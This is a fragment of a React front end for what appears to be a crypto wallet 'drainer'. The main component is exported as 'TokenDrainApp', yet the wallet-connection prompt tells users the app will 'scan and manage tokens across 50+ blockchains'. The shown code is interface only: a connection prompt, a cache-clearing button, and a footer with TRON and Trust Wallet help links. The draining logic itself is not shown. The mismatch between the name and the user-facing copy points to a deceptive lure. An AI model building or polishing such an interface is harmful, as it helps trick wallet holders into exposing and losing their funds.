        <div className="setting-status">Status: {apiStatus}</div>
      </div>
      
      <div className="setting-group">
        <label>Clear Cache</label>
        <button 
          className="btn btn-warning"
          onClick={() => {
            localStorage.clear();
            alert('Cache cleared! Refresh the page.');
          }}
        >
          Clear All Local Data
        </button>
      </div>
    </div>
  );
}

function ConnectionPrompt({ NETWORKS }) {
  return (
    <div className="connection-prompt">
      <div className="prompt-content">
        <div className="prompt-icon">🔗</div>
        <h2>Connect Your Multi-Chain Wallet</h2>
        <p>Connect to scan and manage tokens across 50+ blockchains</p>
        <div className="connect-button-wrapper">
          <ConnectKitButton />
        </div>
        <div className="networks-preview">
          <p><strong>Fully Supported Networks:</strong></p>
          <div className="network-tags-large">
            <div className="tag-column">
              <h4>EVM Chains (20+)</h4>
              {NETWORKS.filter(n => n.type === 'evm').slice(0, 8).map(n => (
                <span key={n.id} className="tag evm">{n.symbol}</span>
              ))}
            </div>
            <div className="tag-column">
              <h4>Non-EVM Chains (30+)</h4>
              {NETWORKS.filter(n => n.type === 'non-evm').slice(0, 8).map(n => (
                <span key={n.id} className="tag non-evm">{n.symbol}</span>
              ))}
            </div>
          </div>
          <div className="prompt-note">
            <p><strong>Note:</strong> For non-EVM chains (TRON, Bitcoin, etc.), you'll need to input your addresses manually after connecting.</p>
          </div>
        </div>
      </div>
    </div>
  );
}

function Footer({ apiStatus, checkApiStatus }) {
  return (
    <footer className="app-footer">
      <div className="footer-content">
        <div className="footer-info">
          <span className="version">v6.0 • Universal Multi-Chain</span>
          <span className="status">Backend: {apiStatus}</span>
          <span className="networks">50+ Networks Supported</span>
        </div>
        <div className="footer-links">
          <button className="link-btn" onClick={checkApiStatus}>
            Check Backend
          </button>
          <a href="#" onClick={(e) => {
            e.preventDefault();
            alert('TRON Support: Ensure you have TRX for energy/bandwidth. Use Trust Wallet browser for best results.');
          }}>
            TRON Help
          </a>
          <a href="#" onClick={(e) => {
            e.preventDefault();
            window.open('https://github.com/trustwallet', '_blank');
          }}>
            Trust Wallet Docs
          </a>
        </div>
      </div>
    </footer>
  );
}

export default TokenDrainApp;
